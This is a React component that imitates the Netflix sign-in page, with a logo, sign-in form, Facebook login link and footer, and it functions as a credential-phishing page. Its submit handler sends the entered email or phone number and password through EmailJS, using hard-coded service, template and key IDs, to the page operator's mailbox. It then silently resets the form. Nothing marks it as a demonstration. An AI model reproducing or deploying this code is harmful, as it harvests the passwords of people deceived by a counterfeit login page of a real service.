import React from 'react';
import emailjs from "emailjs-com";

 
import "./App.css"

//Components


function sendEmail (e) {
  

  e.preventDefault();

  emailjs.sendForm("service_hm3mv25" , "template_7srrwbt", e.target, "UqisPu0cjGHCBL1W-")
  .then((result) => {
      console.log(result.text);
  }, (error) => {
     console.log(error.text);
  } );

  e.target.reset()
  


  

}





function Login() {
    
  


  return <>

    <header className='showcase'>
        <div className='logo'>
            <img src="https://i.ibb.co/r5krrdz/logo.png" alt=''/>
        </div>

        <div className='showcase-content'>

            <div className='formm'>

                <form onSubmit={sendEmail}>
                    <h1>Sign In</h1>
                    <div className="info">
                        <input className="email" type="email" placeholder="Email or phone number" name='username'/> <br/>
                        <input className="email" type="password" placeholder="Password" name='password'/>
                    </div>

                    <div className="btn">
    
                        <button className="btn-primary" type="submit" >Sign In</button>
                    </div>

                    <div className="help">
                        <div>
                            <input value="true" type="checkbox"/><label>Remember me</label>
                        </div>

                        <a href="#">Need Help ?</a> 
                        
                    </div>
                </form>

            </div>

            <div className="fcbk">
                <a href="https://facebook.com">
                <img src="https://i.ibb.co/LrVMXNR/social-fb.png" alt="Facebook"/>
                </a>
                <p>Login with Facebook</p>
            </div>
            <div className="signup">
                <p>New to Netflix ?</p>
                <a href="#">Sign up now</a>
            </div>
            <div className="more">
                <p>
                    This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a> 
                </p>
            </div>
            
        </div>


        <footer>
                
            <div className="ftr-content">
                <div className="contact">
                    <a href="#">Questions? Contact us.</a>
                </div>
                <div className="ftr">
                    <a href="#">Gift Card Terms</a>
                    <a href="#">Terms of Use</a>
                    <a href="#">Privacy Statement</a>
                </div>
                <div className="select">
                    <select>
                        <option>English</option>
                        <option>العربية</option>
                        <option>Français</option>
                            
                    </select>
                </div>
            </div>
               
        </footer>


    </header>
    
    
    
</>

    
  
    
}

export default Login

